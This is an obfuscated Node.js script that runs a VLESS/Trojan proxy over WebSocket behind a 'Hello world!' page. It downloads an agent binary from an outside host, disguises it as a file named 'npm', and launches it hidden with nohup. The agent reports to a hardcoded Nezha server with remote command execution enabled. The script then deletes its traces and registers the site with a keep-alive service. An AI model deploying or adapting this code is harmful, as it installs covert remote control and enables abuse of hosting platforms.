const _0x134c2e=_0x3c82;(function(_0xfae6cb,_0x61b9fd){const _0x5e8f4d=_0x3c82,_0x42e3ea=_0xfae6cb();while(!![]){try{const _0x141c04=parseInt(_0x5e8f4d(0x1f0))/0x1+parseInt(_0x5e8f4d(0x1cf))/0x2*(parseInt(_0x5e8f4d(0x212))/0x3)+-parseInt(_0x5e8f4d(0x210))/0x4*(-parseInt(_0x5e8f4d(0x1f8))/0x5)+parseInt(_0x5e8f4d(0x231))/0x6+-parseInt(_0x5e8f4d(0x1ee))/0x7*(parseInt(_0x5e8f4d(0x21c))/0x8)+parseInt(_0x5e8f4d(0x1c5))/0x9+-parseInt(_0x5e8f4d(0x21b))/0xa*(parseInt(_0x5e8f4d(0x1f2))/0xb);if(_0x141c04===_0x61b9fd)break;else _0x42e3ea['push'](_0x42e3ea['shift']());}catch(_0x3871cf){_0x42e3ea['push'](_0x42e3ea['shift']());}}}(_0x21c0,0x19460));const os=require('os'),http=require(_0x134c2e(0x1f3)),fs=require('fs'),axios=require('axios'),net=require(_0x134c2e(0x1cc)),path=require('path'),crypto=require(_0x134c2e(0x20e)),{Buffer}=require(_0x134c2e(0x1d6)),{exec,execSync}=require(_0x134c2e(0x205)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x134c2e(0x1e0),NEZHA_SERVER=process[_0x134c2e(0x225)][_0x134c2e(0x1da)]||_0x134c2e(0x1bf),NEZHA_PORT=process['env']['NEZHA_PORT']||_0x134c2e(0x227),NEZHA_KEY=process[_0x134c2e(0x225)][_0x134c2e(0x219)]||_0x134c2e(0x201),DOMAIN=process['env'][_0x134c2e(0x20b)]||_0x134c2e(0x1e4),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x134c2e(0x1dd)]||UUID[_0x134c2e(0x1bd)](0x0,0x8),SUB_PATH=process[_0x134c2e(0x225)][_0x134c2e(0x1e9)]||_0x134c2e(0x1d1),NAME=process[_0x134c2e(0x225)][_0x134c2e(0x213)]||_0x134c2e(0x1e7),PORT=process[_0x134c2e(0x225)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x533267=_0x134c2e;try{const _0x25e766=await axios[_0x533267(0x1d8)](_0x533267(0x1fe)),_0x400274=_0x25e766[_0x533267(0x1d7)];ISP=(_0x400274['country']+'-'+_0x400274['asOrganization'])['replace'](/ /g,'_');}catch(_0x5dcf23){ISP=_0x533267(0x1e6);}};GetISP();const httpServer=http[_0x134c2e(0x1fb)]((_0x1a66d0,_0x142dda)=>{const _0x3b1bcd=_0x134c2e;if(_0x1a66d0[_0x3b1bcd(0x22f)]==='/'){const _0x2c772a=path[_0x3b1bcd(0x22e)](__dirname,_0x3b1bcd(0x1b2));fs[_0x3b1bcd(0x215)](_0x2c772a,_0x3b1bcd(0x1ba),(_0x2f2fae,_0x50ae59)=>{const _0x3a4c50=_0x3b1bcd;if(_0x2f2fae){_0x142dda[_0x3a4c50(0x1b9)](0xc8,{'Content-Type':'text/html'}),_0x142dda[_0x3a4c50(0x211)](_0x3a4c50(0x204));return;}_0x142dda[_0x3a4c50(0x1b9)](0xc8,{'Content-Type':'text/html'}),_0x142dda[_0x3a4c50(0x211)](_0x50ae59);});return;}else{if(_0x1a66d0['url']==='/'+SUB_PATH){const _0x150963='vless://'+UUID+'@'+DOMAIN+_0x3b1bcd(0x200)+DOMAIN+_0x3b1bcd(0x220)+DOMAIN+_0x3b1bcd(0x1f9)+WSPATH+'#'+NAME+'-'+ISP,_0x29d114=_0x3b1bcd(0x1cd)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x3b1bcd(0x220)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x31628e=_0x150963+'\x0a'+_0x29d114,_0x5340ad=Buffer['from'](_0x31628e)[_0x3b1bcd(0x1b3)]('base64');_0x142dda['writeHead'](0xc8,{'Content-Type':_0x3b1bcd(0x1dc)}),_0x142dda[_0x3b1bcd(0x211)](_0x5340ad+'\x0a');}else _0x142dda[_0x3b1bcd(0x1b9)](0x194,{'Content-Type':_0x3b1bcd(0x1dc)}),_0x142dda[_0x3b1bcd(0x211)](_0x3b1bcd(0x232));}}),wss=new WebSocket[(_0x134c2e(0x1d3))]({'server':httpServer}),uuid=UUID[_0x134c2e(0x1c2)](/-/g,''),DNS_SERVERS=[_0x134c2e(0x1be),_0x134c2e(0x224)];function resolveHost(_0x30f9cc){return new Promise((_0x397198,_0x257042)=>{const _0x5b855e=_0x3c82;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5b855e(0x234)](_0x30f9cc)){_0x397198(_0x30f9cc);return;}let _0x1f58b1=0x0;function _0x3a4e47(){const _0xb02adf=_0x5b855e;if(_0x1f58b1>=DNS_SERVERS[_0xb02adf(0x22a)]){_0x257042(new Error(_0xb02adf(0x1c7)+_0x30f9cc+_0xb02adf(0x1c9)));return;}const _0x3bc219=DNS_SERVERS[_0x1f58b1];_0x1f58b1++;const _0x268793=_0xb02adf(0x233)+encodeURIComponent(_0x30f9cc)+_0xb02adf(0x202);axios[_0xb02adf(0x1d8)](_0x268793,{'timeout':0x1388,'headers':{'Accept':_0xb02adf(0x1ed)}})[_0xb02adf(0x1f5)](_0x23678a=>{const _0xab3ba5=_0xb02adf,_0x47dc70=_0x23678a[_0xab3ba5(0x1d7)];if(_0x47dc70[_0xab3ba5(0x1cb)]===0x0&&_0x47dc70[_0xab3ba5(0x1c6)]&&_0x47dc70[_0xab3ba5(0x1c6)][_0xab3ba5(0x22a)]>0x0){const _0x4ffb76=_0x47dc70['Answer']['find'](_0x66532d=>_0x66532d[_0xab3ba5(0x1b8)]===0x1);if(_0x4ffb76){_0x397198(_0x4ffb76[_0xab3ba5(0x1d7)]);return;}}_0x3a4e47();})[_0xb02adf(0x1d9)](_0x66b1b=>{_0x3a4e47();});}_0x3a4e47();});}function _0x21c0(){const _0x51e912=['368ZCViLM','true','error:\x20','connection','&fp=chrome&type=ws&host=','unlink','listen','Automatic\x20Access\x20Task\x20added\x20successfully','1.1.1.1','env','npm\x20is\x20already\x20running,\x20skip\x20running...','443','readUInt16BE','arm64','length','pop','config.yaml','https://arm64.ssss.nyc.mn/agent','join','url','\x20-p\x20','354054xYFrBj','Not\x20Found\x0a','https://dns.google/resolve?name=','test','index.html','toString','includes','split','stream','npm','type','writeHead','utf8','createHash','npm\x20download\x20successfully','slice','8.8.4.4','nezha.mingfei1981.eu.org','decode','once','replace','writeFileSync','2083','419670rTcwkI','Answer','Failed\x20to\x20resolve\x20','chmod\x20+x\x20npm','\x20with\x20all\x20DNS\x20servers','https://amd64.ssss.nyc.mn/agent','Status','net','trojan://','sha224','926FTbtYe','write','sub','log','Server','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://oooo.serv00.net/add-url','buffer','data','get','catch','NEZHA_SERVER','digest','text/plain','WSPATH','pipe','npm\x20is\x20running','faacf142-dee8-48c2-8558-641123eb939c','https://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','--tls','thefreeone-iccmchug.hf.space','arm','Unknown','Hug','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','SUB_PATH','aarch64','createWriteStream','connect','application/dns-json','29477qICmgt','https://amd64.ssss.nyc.mn/v1','177902tIIOxY','send','21703OdVwAb','http','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','then','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','reduce','25msFZKm','&path=%2F','message','createServer','concat','2087','https://speed.cloudflare.com/meta','finish',':443?encryption=none&security=tls&sni=','iXUFthNujehdOxZIjM','&type=A','substr','Hello\x20world!','child_process','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','every','8443','readUInt8','DOMAIN','2096','hex','crypto','error','21676sflOnw','end','1281KXGlvx','NAME','map','readFile','setsid\x20nohup\x20./npm\x20-s\x20','client_secret:\x20','2053','NEZHA_KEY','false','1070KdTQEz'];_0x21c0=function(){return _0x51e912;};return _0x21c0();}function handleVlessConnection(_0x104452,_0x344525){const _0x1331f4=_0x134c2e,[_0x30b8cb]=_0x344525,_0x46c312=_0x344525['slice'](0x1,0x11);if(!_0x46c312[_0x1331f4(0x208)]((_0x33355d,_0x35a703)=>_0x33355d==parseInt(uuid[_0x1331f4(0x203)](_0x35a703*0x2,0x2),0x10)))return![];let _0x2c8df3=_0x344525[_0x1331f4(0x1bd)](0x11,0x12)['readUInt8']()+0x13;const _0x31dcd5=_0x344525['slice'](_0x2c8df3,_0x2c8df3+=0x2)['readUInt16BE'](0x0),_0xb55cb2=_0x344525[_0x1331f4(0x1bd)](_0x2c8df3,_0x2c8df3+=0x1)['readUInt8'](),_0x10001e=_0xb55cb2==0x1?_0x344525[_0x1331f4(0x1bd)](_0x2c8df3,_0x2c8df3+=0x4)[_0x1331f4(0x22e)]('.'):_0xb55cb2==0x2?new TextDecoder()[_0x1331f4(0x1c0)](_0x344525[_0x1331f4(0x1bd)](_0x2c8df3+0x1,_0x2c8df3+=0x1+_0x344525[_0x1331f4(0x1bd)](_0x2c8df3,_0x2c8df3+0x1)[_0x1331f4(0x20a)]())):_0xb55cb2==0x3?_0x344525['slice'](_0x2c8df3,_0x2c8df3+=0x10)[_0x1331f4(0x1f7)]((_0x26e8ea,_0x10edd6,_0xb264d0,_0x2c142c)=>_0xb264d0%0x2?_0x26e8ea[_0x1331f4(0x1fc)](_0x2c142c[_0x1331f4(0x1bd)](_0xb264d0-0x1,_0xb264d0+0x1)):_0x26e8ea,[])[_0x1331f4(0x214)](_0x5978a4=>_0x5978a4['readUInt16BE'](0x0)[_0x1331f4(0x1b3)](0x10))['join'](':'):'';_0x104452[_0x1331f4(0x1f1)](new Uint8Array([_0x30b8cb,0x0]));const _0x3c6e3f=createWebSocketStream(_0x104452);return resolveHost(_0x10001e)[_0x1331f4(0x1f5)](_0x490ba0=>{const _0x3ca082=_0x1331f4;net[_0x3ca082(0x1ec)]({'host':_0x490ba0,'port':_0x31dcd5},function(){const _0xe93212=_0x3ca082;this[_0xe93212(0x1d0)](_0x344525[_0xe93212(0x1bd)](_0x2c8df3)),_0x3c6e3f['on']('error',()=>{})[_0xe93212(0x1de)](this)['on'](_0xe93212(0x20f),()=>{})[_0xe93212(0x1de)](_0x3c6e3f);})['on'](_0x3ca082(0x20f),()=>{});})[_0x1331f4(0x1d9)](_0x225021=>{const _0x3517dc=_0x1331f4;net['connect']({'host':_0x10001e,'port':_0x31dcd5},function(){const _0x28929b=_0x3c82;this[_0x28929b(0x1d0)](_0x344525['slice'](_0x2c8df3)),_0x3c6e3f['on'](_0x28929b(0x20f),()=>{})[_0x28929b(0x1de)](this)['on'](_0x28929b(0x20f),()=>{})[_0x28929b(0x1de)](_0x3c6e3f);})['on'](_0x3517dc(0x20f),()=>{});}),!![];}function handleTrojanConnection(_0x3f4786,_0x1249b7){const _0x684c7a=_0x134c2e;try{if(_0x1249b7[_0x684c7a(0x22a)]<0x3a)return![];const _0x18aec5=_0x1249b7[_0x684c7a(0x1bd)](0x0,0x38)[_0x684c7a(0x1b3)](),_0x5ccf0b=[UUID];let _0x31d22c=null;for(const _0x103b3a of _0x5ccf0b){const _0x443967=crypto[_0x684c7a(0x1bb)](_0x684c7a(0x1ce))['update'](_0x103b3a)[_0x684c7a(0x1db)](_0x684c7a(0x20d));if(_0x443967===_0x18aec5){_0x31d22c=_0x103b3a;break;}}if(!_0x31d22c)return![];let _0x1b89d4=0x38;_0x1249b7[_0x1b89d4]===0xd&&_0x1249b7[_0x1b89d4+0x1]===0xa&&(_0x1b89d4+=0x2);const _0x1cdf41=_0x1249b7[_0x1b89d4];if(_0x1cdf41!==0x1)return![];_0x1b89d4+=0x1;const _0x1a0450=_0x1249b7[_0x1b89d4];_0x1b89d4+=0x1;let _0x3935f5,_0x10605e;if(_0x1a0450===0x1)_0x3935f5=_0x1249b7['slice'](_0x1b89d4,_0x1b89d4+0x4)[_0x684c7a(0x22e)]('.'),_0x1b89d4+=0x4;else{if(_0x1a0450===0x3){const _0x3fc06c=_0x1249b7[_0x1b89d4];_0x1b89d4+=0x1,_0x3935f5=_0x1249b7[_0x684c7a(0x1bd)](_0x1b89d4,_0x1b89d4+_0x3fc06c)[_0x684c7a(0x1b3)](),_0x1b89d4+=_0x3fc06c;}else{if(_0x1a0450===0x4)_0x3935f5=_0x1249b7[_0x684c7a(0x1bd)](_0x1b89d4,_0x1b89d4+0x10)['reduce']((_0x4896cd,_0x2849ef,_0x329884,_0x38c08c)=>_0x329884%0x2?_0x4896cd['concat'](_0x38c08c[_0x684c7a(0x1bd)](_0x329884-0x1,_0x329884+0x1)):_0x4896cd,[])[_0x684c7a(0x214)](_0x147c67=>_0x147c67[_0x684c7a(0x228)](0x0)[_0x684c7a(0x1b3)](0x10))[_0x684c7a(0x22e)](':'),_0x1b89d4+=0x10;else return![];}}_0x10605e=_0x1249b7[_0x684c7a(0x228)](_0x1b89d4),_0x1b89d4+=0x2;_0x1b89d4<_0x1249b7['length']&&_0x1249b7[_0x1b89d4]===0xd&&_0x1249b7[_0x1b89d4+0x1]===0xa&&(_0x1b89d4+=0x2);const _0x5ed209=createWebSocketStream(_0x3f4786);return resolveHost(_0x3935f5)[_0x684c7a(0x1f5)](_0x4f0c17=>{const _0xcc2006=_0x684c7a;net[_0xcc2006(0x1ec)]({'host':_0x4f0c17,'port':_0x10605e},function(){const _0x222c34=_0xcc2006;_0x1b89d4<_0x1249b7[_0x222c34(0x22a)]&&this[_0x222c34(0x1d0)](_0x1249b7[_0x222c34(0x1bd)](_0x1b89d4)),_0x5ed209['on'](_0x222c34(0x20f),()=>{})[_0x222c34(0x1de)](this)['on']('error',()=>{})[_0x222c34(0x1de)](_0x5ed209);})['on'](_0xcc2006(0x20f),()=>{});})[_0x684c7a(0x1d9)](_0xf45900=>{const _0x106524=_0x684c7a;net[_0x106524(0x1ec)]({'host':_0x3935f5,'port':_0x10605e},function(){const _0x1ad3a1=_0x106524;_0x1b89d4<_0x1249b7['length']&&this['write'](_0x1249b7[_0x1ad3a1(0x1bd)](_0x1b89d4)),_0x5ed209['on'](_0x1ad3a1(0x20f),()=>{})[_0x1ad3a1(0x1de)](this)['on'](_0x1ad3a1(0x20f),()=>{})[_0x1ad3a1(0x1de)](_0x5ed209);})['on'](_0x106524(0x20f),()=>{});}),!![];}catch(_0x14d222){return![];}}wss['on'](_0x134c2e(0x21f),(_0xa8663a,_0x258b29)=>{const _0x4ee733=_0x134c2e,_0x5964d3=_0x258b29[_0x4ee733(0x22f)]||'';_0xa8663a[_0x4ee733(0x1c1)](_0x4ee733(0x1fa),_0x1b153f=>{const _0x2842d1=_0x4ee733;if(_0x1b153f[_0x2842d1(0x22a)]>0x11&&_0x1b153f[0x0]===0x0){const _0x2be312=_0x1b153f[_0x2842d1(0x1bd)](0x1,0x11),_0xd30754=_0x2be312[_0x2842d1(0x208)]((_0xec5c7b,_0x5475e4)=>_0xec5c7b==parseInt(uuid[_0x2842d1(0x203)](_0x5475e4*0x2,0x2),0x10));if(_0xd30754){!handleVlessConnection(_0xa8663a,_0x1b153f)&&_0xa8663a['close']();return;}}!handleTrojanConnection(_0xa8663a,_0x1b153f)&&_0xa8663a['close']();})['on'](_0x4ee733(0x20f),()=>{});});const getDownloadUrl=()=>{const _0x4854ed=_0x134c2e,_0x37f3f2=os['arch']();return _0x37f3f2===_0x4854ed(0x1e5)||_0x37f3f2===_0x4854ed(0x229)||_0x37f3f2===_0x4854ed(0x1ea)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x4854ed(0x22d):!NEZHA_PORT?_0x4854ed(0x1ef):_0x4854ed(0x1ca);},downloadFile=async()=>{const _0x551cde=_0x134c2e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1c2586=getDownloadUrl(),_0x5d5b3c=await axios({'method':_0x551cde(0x1d8),'url':_0x1c2586,'responseType':_0x551cde(0x1b6)}),_0x396e9e=fs[_0x551cde(0x1eb)](_0x551cde(0x1b7));return _0x5d5b3c[_0x551cde(0x1d7)]['pipe'](_0x396e9e),new Promise((_0x5b23c6,_0xabfc2b)=>{const _0x2e2f6a=_0x551cde;_0x396e9e['on'](_0x2e2f6a(0x1ff),()=>{const _0x31db4f=_0x2e2f6a;console[_0x31db4f(0x1d2)](_0x31db4f(0x1bc)),exec(_0x31db4f(0x1c8),_0x2c6a81=>{if(_0x2c6a81)_0xabfc2b(_0x2c6a81);_0x5b23c6();});}),_0x396e9e['on'](_0x2e2f6a(0x20f),_0xabfc2b);});}catch(_0x716d9a){throw _0x716d9a;}},runnz=async()=>{const _0x792100=_0x134c2e;try{const _0x533658=execSync(_0x792100(0x1e8),{'encoding':'utf-8'});if(_0x533658['trim']()!==''){console[_0x792100(0x1d2)](_0x792100(0x226));return;}}catch(_0x2095ff){}await downloadFile();let _0x2c316f='',_0x54c64f=[_0x792100(0x227),_0x792100(0x209),_0x792100(0x20c),_0x792100(0x1fd),_0x792100(0x1c4),_0x792100(0x218)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3bff76=_0x54c64f[_0x792100(0x1b4)](NEZHA_PORT)?_0x792100(0x1e3):'';_0x2c316f=_0x792100(0x216)+NEZHA_SERVER+':'+NEZHA_PORT+_0x792100(0x230)+NEZHA_KEY+'\x20'+_0x3bff76+_0x792100(0x207);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17b768=NEZHA_SERVER[_0x792100(0x1b4)](':')?NEZHA_SERVER[_0x792100(0x1b5)](':')[_0x792100(0x22b)]():'',_0x250aa9=_0x54c64f[_0x792100(0x1b4)](_0x17b768)?_0x792100(0x21d):_0x792100(0x21a),_0x2f1d48=_0x792100(0x217)+NEZHA_KEY+_0x792100(0x1e2)+NEZHA_SERVER+_0x792100(0x1f4)+_0x250aa9+_0x792100(0x1d4)+UUID;fs[_0x792100(0x1c3)](_0x792100(0x22c),_0x2f1d48);}_0x2c316f=_0x792100(0x1f6);}else{console[_0x792100(0x1d2)](_0x792100(0x206));return;}}try{exec(_0x2c316f,{'shell':'/bin/bash'},_0x3a8224=>{const _0x23064a=_0x792100;if(_0x3a8224)console[_0x23064a(0x20f)]('npm\x20running\x20error:',_0x3a8224);else console[_0x23064a(0x1d2)](_0x23064a(0x1df));});}catch(_0x1d54bb){console[_0x792100(0x20f)](_0x792100(0x21e)+_0x1d54bb);}};async function addAccessTask(){const _0x5ab98d=_0x134c2e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x124794=_0x5ab98d(0x1e1)+DOMAIN+'/'+SUB_PATH;try{const _0xe237c5=await axios['post'](_0x5ab98d(0x1d5),{'url':_0x124794},{'headers':{'Content-Type':'application/json'}});console['log'](_0x5ab98d(0x223));}catch(_0xe11892){}}function _0x3c82(_0x2c190f,_0x534943){const _0x21c0a8=_0x21c0();return _0x3c82=function(_0x3c8294,_0x16f33e){_0x3c8294=_0x3c8294-0x1b2;let _0x146b9a=_0x21c0a8[_0x3c8294];return _0x146b9a;},_0x3c82(_0x2c190f,_0x534943);}const delFiles=()=>{const _0x5856c5=_0x134c2e;fs[_0x5856c5(0x221)](_0x5856c5(0x1b7),()=>{}),fs[_0x5856c5(0x221)](_0x5856c5(0x22c),()=>{});};httpServer[_0x134c2e(0x222)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
